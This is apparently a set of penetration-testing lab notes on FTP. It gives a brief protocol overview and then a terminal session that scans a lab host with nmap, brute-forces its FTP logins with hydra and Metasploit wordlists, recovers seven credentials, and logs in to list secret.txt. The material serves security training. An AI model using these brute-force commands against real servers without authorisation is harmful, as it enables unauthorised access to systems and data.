FTP (File Transfer Protocol)
 + FTP is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients
 + It is also frequently used as means of transferring files to and from the directory of a web server
 + FTP authentication requires a username and password combination. As a result, we can perform a brute-force attack on the FP server in order to identify legitimate credentials
 + In some cases, FTP servers may be configured to allow anonymous access, which consequently allows anyone to access to the FTP server without providing any legitimate credentials

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
6238: eth0@if6239: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:08 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.8/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
6241: eth1@if6242: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:27:f4:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.39.244.2/24 brd 192.39.244.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~# ping -c 5 192.39.244.3
PING 192.39.244.3 (192.39.244.3) 56(84) bytes of data.
64 bytes from 192.39.244.3: icmp_seq=1 ttl=64 time=0.082 ms
64 bytes from 192.39.244.3: icmp_seq=2 ttl=64 time=0.036 ms
64 bytes from 192.39.244.3: icmp_seq=3 ttl=64 time=0.037 ms
64 bytes from 192.39.244.3: icmp_seq=4 ttl=64 time=0.040 ms
64 bytes from 192.39.244.3: icmp_seq=5 ttl=64 time=0.047 ms

--- 192.39.244.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 107ms
rtt min/avg/max/mdev = 0.036/0.048/0.082/0.018 ms
root@attackdefense:~# nmap 192.39.244.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-20 10:19 UTC
Nmap scan report for target-1 (192.39.244.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:C0:27:F4:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
root@attackdefense:~# nmap -sV -O 192.39.244.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-20 10:19 UTC
Nmap scan report for target-1 (192.39.244.3)
Host is up (0.000024s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:27:F4:03 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=7/20%OT=21%CT=1%CU=42092%PV=N%DS=1%DC=D%G=Y%M=0242C0%T
OS:M=64B90A4B%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.39.244.3 ftp
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-20 10:21:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://192.39.244.3:21/
[21][ftp] host: 192.39.244.3   login: sysadmin   password: 654321
[21][ftp] host: 192.39.244.3   login: rooty   password: qwerty
[21][ftp] host: 192.39.244.3   login: demo   password: butterfly
[21][ftp] host: 192.39.244.3   login: auditor   password: chocolate
[21][ftp] host: 192.39.244.3   login: anon   password: purple
[21][ftp] host: 192.39.244.3   login: administrator   password: tweety
[21][ftp] host: 192.39.244.3   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-20 10:22:43
root@attackdefense:~# ftp 
ftp> ^C
ftp> exit
root@attackdefense:~# ftp -h

        Usage: { ftp | pftp } [-46pinegvtd] [hostname]
           -4: use IPv4 addresses only
           -6: use IPv6, nothing else
           -p: enable passive mode (default for pftp)
           -i: turn off prompting during mget
           -n: inhibit auto-login
           -e: disable readline support, if present
           -g: disable filename globbing
           -v: verbose mode
           -t: enable packet tracing [nonfunctional]
           -d: enable debugging

root@attackdefense:~# ftp 192.39.244.3
Connected to 192.39.244.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.39.244.3]
Name (192.39.244.3:root): sysadmin 
331 Password required for sysadmin
Password:
230 User sysadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
```